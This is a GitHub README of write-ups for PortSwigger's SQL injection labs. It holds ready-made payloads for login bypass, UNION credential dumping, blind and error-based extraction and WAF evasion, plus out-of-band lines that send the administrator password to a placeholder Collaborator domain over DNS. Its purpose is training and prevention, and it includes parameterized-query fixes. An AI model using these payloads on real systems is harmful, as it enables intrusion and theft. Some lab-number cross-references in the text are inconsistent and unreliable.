# 💉 SQL Injection — Complete Lab Series

<div align="center">

![CATEGORY](https://img.shields.io/badge/CATEGORY-SQL%20INJECTION-FF4500?style=for-the-badge)
![LABS COMPLETED](https://img.shields.io/badge/LABS%20COMPLETED-18%2F18-00C853?style=for-the-badge)

![DIFFICULTY](https://img.shields.io/badge/DIFFICULTY-APPRENTICE%20TO%20EXPERT-9C27B0?style=for-the-badge)
![STATUS](https://img.shields.io/badge/STATUS-100%25%20COMPLETE-00C853?style=for-the-badge)

**Finished all 18 PortSwigger SQLi labs — Apprentice through Expert.**

[![Main Repository](https://img.shields.io/badge/🔗%20Main%20Repository-181717?style=for-the-badge)](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) [![About Me](https://img.shields.io/badge/👤%20About%20Me-2C3E50?style=for-the-badge)](https://github.com/Gurpreet-Singh-offensive-Security) [![Contact](https://img.shields.io/badge/📧%20Contact-D14836?style=for-the-badge)](mailto:gskhalsa6245@gmail.com)

</div>

---

Writeups below cover what I actually did in each lab, not the theory. The cheat sheet at the bottom is what I kept open while working through the blind injection labs.

**Time spent:** ~60 hours across the full series  
**Tools:** Burp Suite Pro, SQLMap, Python for a few custom scripts  
**Databases hit:** MySQL, PostgreSQL, Oracle, MSSQL

---
## Labs

### Apprentice — 2/2

Short ones but don't skip them — Lab 1 is the starting point for understanding how WHERE clause injection works, and Lab 2 is a classic you'll see variants of everywhere.

| # | Lab | What I did | Technique |
|---|-----|-----------|-----------|
| 1 | [WHERE Clause — Retrieve Hidden Data](./LAB-1-SQL-Injection.md) | Injected `' OR 1=1--` into the category filter. Turns the WHERE into an always-true condition — got back all rows including ones the app was hiding. Confirmed by the jump in product count. | In-Band |
| 2 | [Login Bypass](./LAB-2-SQL-Injection.md) | Entered `administrator'--` as the username. Closes the string, comments out the password check entirely. Server just matched on username. Got admin without touching the password field. | Auth Bypass |

---

### Practitioner — 15/15

This is where the bulk of the series lives — fingerprinting, UNION extraction, enumeration, and all the blind techniques. The blind labs (11–17) are the hardest mental shift. No data in the response means you have to read the application's behaviour as a signal — a status code, a delay, a DNS ping.

| # | Lab | What I did | Technique |
|---|-----|-----------|-----------|
| 3 | [DB Version — Oracle](./LAB-3-SQL-Injection.md) | Oracle needs `FROM dual` in every SELECT — trips people up if they're used to MySQL. `UNION SELECT BANNER,NULL FROM v$version--` returned the full version banner. | Fingerprinting |
| 4 | [DB Version — MySQL/MSSQL](./LAB-4-SQL-Injection.md) | `UNION SELECT @@version,NULL#` — MySQL needs `#` or a space after `--` for comment syntax, not just `--`. Got the version string, confirmed the DB engine. | Fingerprinting |
| 5 | [List DB Contents — non-Oracle](./LAB-5-SQL-Injection.md) | Queried `information_schema.tables` for table names, then `information_schema.columns` once I had the users table name. Final payload dumped credentials. Straightforward but easy to mess up if the table name has a random suffix — it did. | Enumeration |
| 6 | [List DB Contents — Oracle](./LAB-6-SQL-Injection.md) | Oracle doesn't have `information_schema`. Used `all_tables` and `all_columns` instead. Same end result — just different catalog syntax. Worth knowing cold if you're doing Oracle engagements. | Enumeration |
| 7 | [UNION — Determine Column Count](./LAB-7-SQL-Injection.md) | Incremented `ORDER BY` until I hit an error at 3 — so 2 columns. Cross-checked with `UNION SELECT NULL,NULL--`. Always do both, ORDER BY can behave differently depending on the DB. | UNION |
| 8 | [UNION — Find String Columns](./LAB-8-SQL-Injection.md) | 2 columns confirmed. Swapped NULLs for `'test'` one at a time. Second column reflected the string back. You need at least one string column before you can pull real data. | UNION |
| 9 | [UNION — Retrieve Data from Other Tables](./LAB-9-SQL-Injection.md) | Both columns string-compatible. `UNION SELECT username,password FROM users--` — credentials dumped straight into the product listing. Plain text. | UNION |
| 10 | [UNION — Multiple Values in Single Column](./LAB-10-SQL-Injection.md) | Only one usable column this time. Concatenated with `username\|\|'~'\|\|password` — tilde as a delimiter so I could split it client-side. Got everything in one shot. | UNION |
| 11 | [Blind — Conditional Responses](./LAB-11-SQL-Injection.md) | Injected into the TrackingId cookie. `AND 1=1--` kept "Welcome back" in the response. `AND 1=2--` removed it. Used that as a boolean oracle to pull the password one character at a time with `SUBSTRING`. Intruder Cluster Bomb to automate it — response length was the differentiator. | Blind Boolean |
| 12 | [Blind — Conditional Errors](./LAB-12-SQL-Injection.md) | No page difference on true/false. Switched to error-based oracle — division by zero in a CASE expression on Oracle. True condition = 500 error, false = 200. HTTP status becomes your data channel. Same char-by-char extraction with Intruder, filtering on response code instead of length. | Blind Error |
| 13 | [Visible Error-Based SQLi](./LAB-13-SQL-Injection.md) | Verbose errors were on. Injected `AND 1=CAST((SELECT username FROM users LIMIT 1) AS integer)--`. PostgreSQL tries to cast the string to int, fails, and throws the value back in the error message. Did the same with the password column. No blind technique needed — the DB just handed it over. | Error Based |
| 14 | [Blind — Time Delays](./LAB-14-SQL-Injection.md) | Nothing in the response at all — not even a status code difference. `'; SELECT pg_sleep(10)--` caused a 10s hang. That confirmed both the injection point and that it was PostgreSQL. No extraction yet, just confirming the channel exists. | Blind Time |
| 15 | [Blind — Time Delays + Data Exfiltration](./LAB-15-SQL-Injection.md) | Built on Lab 14. Conditional sleep: `CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END`. One thread in Intruder's Resource Pool — if you run concurrent threads the timing breaks and you get garbage. Slow but it works. | Blind Time |
| 16 | [Blind — OOB Interaction](./LAB-16-SQL-Injection.md) | App was processing the query async. No boolean signal, no timing signal. Dropped an Oracle XXE payload pointing at a Burp Collaborator subdomain. Got a DNS hit back. That's your confirmation — the DB can reach out. | Blind OOB |
| 17 | [Blind — OOB Data Exfiltration](./LAB-17-SQL-Injection.md) | Extended Lab 16. Embedded the password query inside the DNS lookup itself — `(SELECT password FROM users WHERE username='administrator')` as a subdomain prefix. Collaborator received the lookup with the password in the hostname. Read it straight from the interaction log. | Blind OOB |
| 18 | [Filter Bypass via XML Encoding](./LAB-18-SQL-Injection.md) | WAF was blocking SQLi keywords in the request body. Payload was inside an XML parameter. Hex-encoded the keywords — `&#x53;ELECT` instead of `SELECT`. WAF didn't decode before matching. The XML parser on the backend did. Payload executed cleanly. | WAF Bypass |

---

## Techniques

### UNION Injection

Before you can pull data, you need to know the column count and which columns reflect text. Both steps are non-negotiable — get either wrong and UNION fails silently or throws an error that misleads you.

```sql
-- Column count via ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- error here = 2 columns

-- Verify with UNION (NULLs are type-safe)
' UNION SELECT NULL,NULL--

-- Find string columns (swap NULLs one at a time)
' UNION SELECT 'test',NULL--
' UNION SELECT NULL,'test'--

-- Pull data
' UNION SELECT username,password FROM users--

-- Only one string column available? Concatenate
' UNION SELECT NULL,username||'~'||password FROM users--
```

Version fingerprinting by DB:

```sql
' UNION SELECT BANNER,NULL FROM v$version--      -- Oracle
' UNION SELECT @@version,NULL--                  -- MySQL, MSSQL
' UNION SELECT version(),NULL--                  -- PostgreSQL
```

---

### Boolean Blind

The page has two states — something changes when your condition is true vs false. That's all you need. You ask yes/no questions and read the answer from the page.

```sql
-- Establish the oracle
' AND 1=1--    -- normal page
' AND 1=2--    -- something changes (message disappears, element missing, length diff)

-- Confirm the table exists before wasting time extracting
' AND (SELECT 'x' FROM users LIMIT 1)='x'--

-- Extract char by char (Intruder automates this)
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--

-- Automate: Cluster Bomb attack in Intruder
-- Position 1 = character index (1-20)
-- Position 2 = character value (a-z, 0-9, A-Z)
-- Differentiator: response length
```

---

### Time-Based Blind

When there's genuinely nothing to read in the response — no length diff, no status diff — timing is the last resort. Works well, just slow.

```sql
-- Confirm the channel first (flat delay, no condition)
'; SELECT pg_sleep(10)--                                           -- PostgreSQL
'; SELECT SLEEP(10)--                                              -- MySQL
'; WAITFOR DELAY '0:0:10'--                                        -- MSSQL
'; SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),10) FROM dual--          -- Oracle

-- Conditional delay for extraction (PostgreSQL)
'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a')
   THEN pg_sleep(5) ELSE pg_sleep(0) END
   FROM users WHERE username='administrator'--

-- Important: 1 thread only in Intruder Resource Pool
-- Multiple threads destroy timing accuracy
```

---

### Out-of-Band Exfiltration

Used when the app processes queries asynchronously and you get zero feedback — no boolean, no timing. Make the DB initiate a DNS request carrying your data as a subdomain.

```sql
-- Oracle (Burp Collaborator) — data exfil via DNS
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM
"http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-COLLABORATOR-ID.oastify.com/"> %remote;]>'),'/l') FROM dual--

-- MSSQL — xp_dirtree DNS lookup
'; exec master..xp_dirtree '//'+(SELECT password FROM users WHERE username='administrator')+'.YOUR-COLLABORATOR-ID.oastify.com/a'--

-- Check Collaborator for incoming DNS — the subdomain prefix is your value
```

---

### WAF Bypass — XML Encoding

If you're injecting into an XML parameter and getting blocked, hex entity encoding is usually the first thing to try. Most WAFs match on raw keyword strings pre-decode.

```xml
<!-- Instead of SELECT, use hex entities -->
<storeId>1 &#x55;NION &#x53;ELECT NULL--</storeId>

<!-- WAF sees: 1 &#x55;NION &#x53;ELECT NULL-- (no keyword match) -->
<!-- Backend XML parser decodes it before the query runs -->
```

Other bypass approaches worth knowing:

```
Case variation:          uNiOn SeLeCt
Comment insertion:       UN/**/ION SEL/**/ECT   (MySQL)
Whitespace substitution: UNION%09SELECT         (tab)
Double URL encoding:     %2527 → '
```

---

### Error-Based Extraction

When verbose errors are enabled, you can skip blind techniques entirely. Force a type mismatch — the DB fails to cast your string to an integer and includes the actual value in the error message.

```sql
-- PostgreSQL
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS integer)--
-- Returns: ERROR: invalid input syntax for type integer: "actualpasswordhere"

-- MSSQL
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--

-- Oracle
' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT password FROM users WHERE username='administrator'))--
```

---

## DB Reference

### Enumerating Schema

```sql
-- MySQL / PostgreSQL / MSSQL
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Oracle (no information_schema)
SELECT table_name FROM all_tables
SELECT column_name FROM all_columns WHERE table_name='USERS'
```

### Concatenation

| DB | Syntax |
|----|--------|
| Oracle | `'a'\|\|'b'` |
| MSSQL | `'a'+'b'` |
| PostgreSQL | `'a'\|\|'b'` |
| MySQL | `CONCAT('a','b')` |

### Comments

| DB | Style |
|----|-------|
| MySQL | `--` or `#` (note: `--` needs trailing space) |
| MSSQL | `--` |
| PostgreSQL | `--` |
| Oracle | `--` |

---

## Possible Parameters in Modern Applications

Where SQL injection vulnerabilities realistically appear in modern applications, APIs, and infrastructure. These are the parameters and input points worth checking specifically when testing for SQLi.

### Common Injection Points

| Parameter | Context | What to test |
|-----------|---------|--------------|
| `id`, `product_id`, `item_id`, `user_id` | URL params, query strings, REST path segments | Integer injection, UNION extraction |
| `category`, `filter`, `sort`, `order`, `orderby` | Filtering and sorting parameters | WHERE clause injection, ORDER BY manipulation |
| `search`, `q`, `query`, `keyword`, `term` | Search bars, autocomplete endpoints | String injection in LIKE clauses |
| `page`, `offset`, `limit`, `start` | Pagination controls | Numeric injection, UNION via LIMIT |
| `username`, `email`, `login` | Login forms, user lookup endpoints | Auth bypass, boolean-based enumeration |
| `name`, `title`, `description`, `comment` | CRUD form fields | Second-order injection — stored then executed later |
| `from`, `to`, `start_date`, `end_date` | Date range filters | Unparameterized date comparisons |

---

### REST API & Modern Backend Surfaces

| Surface | Parameter / Header | What to test |
|---------|--------------------|--------------|
| REST path segments | `/api/users/123`, `/products/electronics` | Replace numeric/string segments directly |
| Query strings | `?sort=price&order=asc` | ORDER BY injection — `order=price,(SELECT 1)` |
| JSON body | `{"id": 1}`, `{"filter": "active"}` | JSON-based SQLi if body is interpolated |
| GraphQL | Inline arguments in queries | Injection inside resolver queries |
| XML body / SOAP | `<id>1</id>`, `<category>shoes</category>` | WAF bypass via entity encoding |
| OData | `$filter`, `$orderby`, `$select` | OData filter-to-SQL translation flaws |
| HTTP headers | `X-Forwarded-For`, `User-Agent`, `Referer`, `Cookie` | Logged or stored headers queried later |

---

### Cookie & Session Parameters

| Parameter | Context | What to test |
|-----------|---------|--------------|
| `TrackingId`, `sessionId`, `analytics_id` | Analytics / tracking cookies | Blind injection — boolean or time-based oracle |
| `lang`, `locale`, `currency` | Preference cookies used in queries | Injected into SELECT or WHERE directly |
| `cart_id`, `order_id`, `ref` | E-commerce session values | Numeric or string injection in backend lookups |
| `remember_token`, `auth_token` | Persistent session tokens | If validated via raw query, injectable |

---

### Second-Order & Stored Injection Points

Second-order injection is stored in the DB on first request and executed in a different query later — standard input validation often misses it entirely.

| Input Point | Where it fires | What to look for |
|-------------|---------------|-----------------|
| Username / display name at registration | Profile display, admin lookup queries | Payload stored clean, executed unsanitized elsewhere |
| Comment / review fields | Moderation dashboards, report exports | Injection appears in internal queries |
| File names on upload | File listing, download handlers | Filename embedded in a query without parameterization |
| Address / profile fields | Order history, billing queries | Stored payload hits a different query on checkout |
| Referral codes, voucher codes | Redemption endpoint SQL lookup | Code value directly interpolated |

---

### Modern Stack & ORM Pitfalls

Frameworks and ORMs reduce raw SQLi risk but don't eliminate it — raw queries still sneak in for performance, complex filtering, or legacy code.

| Stack / ORM | Where raw SQL appears | What to test |
|-------------|----------------------|--------------|
| Django ORM | `.raw()`, `.extra()`, `RawSQL()` | Direct injection in raw query arguments |
| SQLAlchemy | `text()`, `engine.execute()` | String interpolation into `text()` clauses |
| ActiveRecord (Rails) | `.where("col = '#{var}'")`  | String interpolation — parameterize with `?` instead |
| Hibernate (Java) | Native queries, `createNativeQuery()` | HQL injection and native SQL passthrough |
| Sequelize (Node.js) | `query()` method, `literal()` | Unsanitized values in `where` with `literal` |
| Prisma | `$queryRaw`, `$executeRaw` | Template literal injection — use `Prisma.sql` tagged template |
| WordPress / PHP | `$wpdb->query()`, `get_results()` | Direct string concat without `$wpdb->prepare()` |
| Stored procedures | Any SP that builds dynamic SQL internally | `EXEC`, `sp_executesql` with string concat |

---

### Search & Analytics Backends

Applications routing queries through search or analytics layers can have SQLi-equivalent flaws with different syntax.

| Backend | Parameter | What to test |
|---------|-----------|--------------|
| Elasticsearch | `query`, `filter`, `sort` in JSON body | JSON injection in query DSL, script injection |
| Splunk | `search`, SPL query parameters | SPL injection — `| eval`, `| stats` manipulation |
| ClickHouse / BigQuery | SQL-like query parameters | Direct SQL if query is assembled server-side |
| Reporting tools (Metabase, Grafana) | Dashboard filter parameters | SQL injection in native query mode |

---

### Headers That Affect SQL Execution

These aren't body parameters but are commonly logged, stored, or used in queries — and frequently overlooked in security reviews.

```
X-Forwarded-For       → Logged to DB for analytics or rate limiting — injectable if unparameterized
User-Agent            → Stored in access logs or session tables — second-order risk
Referer               → Recorded in referral tracking tables — same risk as User-Agent
Cookie values         → TrackingId, preferences — often queried directly (see Lab 11)
Accept-Language       → Used to query locale/translation tables in some stacks
Authorization         → JWT sub/claims used in queries without validation
```

---

## Fix

Parameterized queries. That's it. Everything else — input validation, WAFs, error suppression — is layered on top and none of it substitutes for this.

```python
# Don't do this
query = "SELECT * FROM products WHERE category = '" + category + "'"

# Do this
query = "SELECT * FROM products WHERE category = %s"
cursor.execute(query, (category,))
```

```javascript
// Node.js
const result = await pool.query(
  'SELECT * FROM users WHERE username = $1 AND password = $2',
  [username, password]
);
```

```java
// Java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM products WHERE category = ?"
);
stmt.setString(1, category);
```

Beyond that: least-privilege DB accounts (app user shouldn't have DROP), generic error messages to users, and WAF rules as a detection layer — not a prevention strategy.

---

## Tools

| Tool | What I used it for |
|------|--------------------|
| Burp Suite Pro | Everything — Repeater for manual testing, Intruder for blind extraction automation |
| SQLMap | Verification after manual exploitation, `--level=5 --risk=3` for thorough coverage |
| Burp Collaborator | OOB interaction and DNS exfiltration (Labs 15-16) |
| Python | Custom timing scripts where Intruder's thread control wasn't granular enough |

---

## Lab Order Recommendation

Do UNION labs (1–9) before anything else. The blind labs assume you already understand what you're looking for when there *is* data in the response — without that baseline, blind injection concepts don't click properly.

Labs 11–16 are the hardest part of this series, mostly because of the mindset shift. There's nothing to look at — you're inferring everything from a page state, an HTTP status, a response time, or a DNS packet. It takes a while to trust that.

Labs 17 and 18 are short. Both rely on understanding how layers of parsing work — WAF vs XML parser in 17, verbose errors in 18. More about knowing the environment than complex exploitation.

---

## Completion
- [x] Lab 1 — WHERE Clause Hidden Data
- [x] Lab 2 — Login Bypass
- [x] Lab 3 — DB Version Oracle
- [x] Lab 4 — DB Version MySQL/MSSQL
- [x] Lab 5 — List DB Contents (non-Oracle)
- [x] Lab 6 — List DB Contents (Oracle)
- [x] Lab 7 — UNION Column Count
- [x] Lab 8 — UNION String Columns
- [x] Lab 9 — UNION Data Extraction
- [x] Lab 10 — UNION Single Column Concat
- [x] Lab 11 — Blind Boolean
- [x] Lab 12 — Blind Conditional Error
- [x] Lab 13 — Visible Error-Based
- [x] Lab 14 — Blind Time Delay
- [x] Lab 15 — Blind Time + Extraction
- [x] Lab 16 — Blind OOB Interaction
- [x] Lab 17 — Blind OOB Exfiltration
- [x] Lab 18 — WAF Bypass XML Encoding

---

## Resources

- [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection)
- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) — keep this open during blind labs
- [OWASP SQLi Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89](https://nvd.nist.gov/vuln/search/results?cwe_id=CWE-89)

Other series in this repo:
- [Authentication Vulnerabilities](../AUTHENTICATION/) — 14 labs done
- XSS — in progress
- Access Control — in progress

---

## Legal

All of this was done on PortSwigger Academy's lab environment. Using these techniques against systems you don't own or don't have written permission to test is illegal in most jurisdictions and not something I'd document here if I did it.

---

<div align="center">

### Gurpreet Singh | Offensive Security Researcher

[![EMAIL](https://img.shields.io/badge/EMAIL-GSKHALSA6245%40GMAIL.COM-EA4335?style=for-the-badge&logo=gmail&logoColor=white)](mailto:gskhalsa6245@gmail.com)

[![GITHUB](https://img.shields.io/badge/GITHUB-GURPREET--SINGH--OFFENSIVE--SECURITY-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) [![LINKEDIN](https://img.shields.io/badge/LINKEDIN-CONNECT-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/gurpreetsingh-security)

**CC BY-NC-ND 4.0 — © 2025 Gurpreet Singh**

</div>
